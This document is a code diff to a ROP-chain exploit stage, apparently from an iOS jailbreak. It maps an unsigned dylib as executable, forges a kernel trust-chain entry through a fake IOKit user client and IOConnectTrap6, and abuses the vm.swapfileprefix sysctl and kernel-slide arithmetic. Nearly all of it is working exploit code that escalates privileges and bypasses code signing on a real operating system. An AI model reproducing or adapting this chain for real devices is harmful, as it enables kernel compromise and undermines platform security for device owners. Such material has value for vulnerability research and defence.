@@ -652,8 +652,28 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf((char*)&buf,sizeof(buf),"testing...");
 	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
-#if 0
+#if 1
 
+	char * dylib_str = malloc(100);
+	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
+	DEFINE_ROP_VAR("dylib_str",100,dylib_str);
+
+	// ghetto dlopen
+	// get a file descriptor for that dylib
+	DEFINE_ROP_VAR("dylib_fd",8,&buf);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("dylib_str",1);
+	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
+	// map it at a fixed address
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG64("dylib_fd",5);
+	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
+	// jump
+	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0xdeadbeef,get_addr_from_name(offsets,"write")-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+
+
+
+	/*
 	CALL("seteuid",501,0,0,0,0,0,0,0); 
 	CALL("seteuid",0,0,0,0,0,0,0,0); 
 
@@ -689,7 +709,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("b",8,&buf);
 	ROP_VAR_ADD("a","a","b");
 
-	/*
 	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
 	memset(myaction,0,sizeof(struct __sigaction));
 	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
@@ -705,7 +724,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
 	ADD_LOOP_START("test_loop")
 		ROP_VAR_ARG_HOW_MANY(1);
-		ROP_VAR_ARG("test_string",2);
+		ROP_VAR_ARG("dylib_str",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
 		
 		/*	
@@ -808,7 +827,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	hash_t my_dylib_hash = {0x04,0xc9,0x9b,0x00,0x5e,0xe4,0x40,0x3b,0xf9,0x19,0x5c,0x93,0xb3,0xb3,0xc8,0x36,0x3b,0x38,0x50,0xb1};
+	hash_t my_dylib_hash = {0x37,0xc1,0xf5,0xbd,0x2e,0xb8,0xdc,0xee,0x9b,0x29,0x7a,0xca,0xec,0x8e,0x5e,0x8d,0xc7,0xc9,0x88,0x2f};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
@@ -1070,6 +1089,12 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("WEDIDIT",2);
 	CALL("write",1,0,1024,0,0,0,0,0);
 
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG64("self",1);
+	ROP_VAR_ARG64("the_one",2);
+	ROP_VAR_ARG64("the_one",3);
+	CALL("mach_port_insert_right",0,0,0,MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
+
 	// get kernel slide
 	// alloc new valid port 
 	DEFINE_ROP_VAR("notification_port",sizeof(mach_port_t),tmp);
@@ -1174,7 +1199,11 @@ _STRUCT_ARM_THREAD_STATE64
 
 	CALL("seteuid",0,0,0,0,0,0,0,0); // we need to be root again otherwise we can't set eh swapprefix
 
-	DEFINE_ROP_VAR("swapprefix_buffer",1024,tmp);
+	char * pattern = malloc(1024);
+	for (int i = 0; i < 1024; i++) {
+		pattern[i] = i;
+	}
+	DEFINE_ROP_VAR("swapprefix_buffer",1024,pattern);
 	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),tmp);
 	// using undocumented magic to get the integer name of vm.swapfileprefix
 	char * name = "vm.swapfileprefix";
@@ -1193,7 +1222,7 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG("swapprefix_oid",1);
 	ROP_VAR_ARG("swapprefix_buffer",5);
-	CALL("sysctl",0,oidlen/4,0,0,100+sizeof(struct trust_chain),0,0,0);
+	CALL("sysctl",0,oidlen/4,0,0,0,1020/*100+sizeof(struct trust_chain)*/,0,0);
 
 	// now the new trust chain entry is at swapprefix_addr + kslide + 100
 	uint64_t * trust_chain_addr = malloc(sizeof(uint64_t));
@@ -1221,7 +1250,7 @@ _STRUCT_ARM_THREAD_STATE64
 	
 	
 	// create a fake UC
-	DEFINE_ROP_VAR("fake_client",0x100*8,tmp);
+	DEFINE_ROP_VAR("fake_client",VTAB_SIZE*8,tmp);
 	
 	DEFINE_ROP_VAR("root_domain_ptr",8,tmp);
 	ROP_VAR_CPY("root_domain_ptr","kobj_client",8);
@@ -1241,6 +1270,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// insert new fake client
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport",offsetof(kport_t,ip_kobject),"fake_client",0);
+	//SET_ROP_VAR64_W_OFFSET("fakeport",0x4141414141414140,offsetof(kport_t,ip_kobject));
 	
 	// patch getExternalTrapForIndex
 	SET_ROP_VAR64("tmp_uint64",offsets->gadget_add_x0_x0_ret);
@@ -1255,16 +1285,17 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
 	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
 	// setup x0
-	ROP_VAR_CPY_W_OFFSET("fake_client",0x40,"bss_trust_chain_head_ptr",0,8);
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0x40,"new_trust_chain_entry_addr",0);
+	SET_ROP_VAR64_W_OFFSET("fake_client",0,0x50); // set 0x50 to 0
 
 	// fire
 	ROP_VAR_ARG_HOW_MANY(2);
 	ROP_VAR_ARG64("the_one",1);
-	ROP_VAR_ARG("new_trust_chain_entry_addr",3);
+	ROP_VAR_ARG64("bss_trust_chain_head_ptr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
-	
+
 	ADD_LOOP_START("sleep");
-		ADD_USLEEP(10000);
+		ADD_USLEEP(100);
 	ADD_LOOP_END();
 
 	// ghetto dlopen
